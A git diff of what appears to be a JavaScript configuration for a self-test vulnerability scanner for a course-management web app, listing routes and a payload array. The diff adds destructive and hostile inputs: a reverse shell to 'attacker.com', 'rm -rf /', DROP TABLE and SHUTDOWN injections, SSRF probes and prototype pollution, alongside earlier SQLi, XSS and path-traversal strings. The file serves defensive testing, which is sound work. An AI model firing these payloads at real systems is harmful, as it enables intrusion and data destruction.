@@ -21,18 +21,18 @@ const PROTECTED_ROUTES = [
     '/dashboard/admin/ad-logs',
     '/dashboard/admin/email-logs',
     '/dashboard/profile',
-    '/api/admin/stats'
+    '/test-certificate',
+    '/security'
 ];
 
 const CRUD_ENDPOINTS = [
-    '/api/courses',
-    '/api/users',
-    '/api/payments',
-    '/api/settings',
-    '/api/enrollments',
-    '/api/vouchers',
-    '/api/announcements',
-    '/api/events'
+    '/courses',
+    '/events',
+    '/dashboard/admin/users',
+    '/dashboard/admin/courses',
+    '/dashboard/admin/events',
+    '/dashboard/admin/announcements',
+    '/dashboard/admin/vouchers'
 ];
 
 const TIMEOUT_MS = 5000;
@@ -62,15 +62,15 @@ const PAYLOADS = [
     { name: 'SQLi - Classic', data: { username: "admin' OR '1'='1", password: "password" } },
     { name: 'SQLi - Union', data: { id: "1' UNION SELECT null,null,username,password FROM users--" } },
     { name: 'SQLi - Blind', data: { id: "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" } },
-    
+
     // NoSQL Injection
     { name: 'NoSQL - Login Bypass', data: { username: { "$gt": "" }, password: { "$gt": "" } } },
     { name: 'NoSQL - Field Injection', data: { "$where": "this.role == 'admin'" } },
-    
+
     // Privilege Escalation
     { name: 'Priv Esc - Role', data: { role: 'admin', is_admin: true, permissions: ['*'] } },
     { name: 'Priv Esc - Metadata', data: { metadata: { role: 'admin' } } },
-    
+
     // Cross-Site Scripting (XSS)
     { name: 'XSS - Basic', data: { name: "<script>alert('XSS')</script>" } },
     { name: 'XSS - Img Error', data: { comment: "<img src=x onerror=alert(1)>" } },
@@ -81,7 +81,20 @@ const PAYLOADS = [
     { name: 'RCE - Pipe', data: { cmd: "| whoami" } },
 
     // Path Traversal
-    { name: 'Traversal', data: { path: "../../../etc/passwd" } }
+    { name: 'Traversal', data: { path: "../../../etc/passwd" } },
+
+    // SSRF (Server-Side Request Forgery)
+    { name: 'SSRF - AWS Metadata', data: { url: "http://200.254.169.254/latest/meta-data/" } },
+    { name: 'SSRF - Localhost', data: { source: "http://localhost:3000/admin/debug" } },
+
+    // DESTRUCTIVE & EXTREME THREATS
+    { name: 'SQLi - DROP TABLE', data: { id: "1'; DROP TABLE users; --" } },
+    { name: 'SQLi - SHUTDOWN', data: { query: "'; SHUTDOWN; --" } },
+    { name: 'RCE - Reverse Shell', data: { exec: "bash -i >& /dev/tcp/attacker.com/4444 0>&1" } },
+    { name: 'RCE - System Wipe', data: { cmd: "; rm -rf / --no-preserve-root" } },
+    { name: 'Prototype Pollution', data: { "__proto__": { "isAdmin": true, "polluted": "yes" } } },
+    { name: 'ReDoS - Regex Bomb', data: { search: "(a+)+$" + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!" } },
+    { name: 'NoSQL - Data Wipe', data: { "_id": { "$ne": null }, "$where": "sleep(5000)" } }
 ];
 
 const MISC_ENDPOINTS = [
@@ -93,16 +106,15 @@ const MISC_ENDPOINTS = [
     '/nginx.conf',
     '/package.json',
     '/.next/server/pages-manifest.json',
-    '/server.js',
-    '/api/non-existent-endpoint-for-error-leak'
+    '/server.js'
 ];
 
 const RATE_LIMIT_ENDPOINTS = [
-    '/api/auth/login',
-    '/api/auth/register',
-    '/api/auth/reset-password',
-    '/dashboard/login',
-    '/api/contact'
+    '/login',
+    '/register',
+    '/contact',
+    '/verify',
+    '/pring'
 ];
 
 module.exports = {
@@ -117,3 +129,4 @@ module.exports = {
     PAYLOADS,
     EXPLOIT_PAYLOADS
 };
+
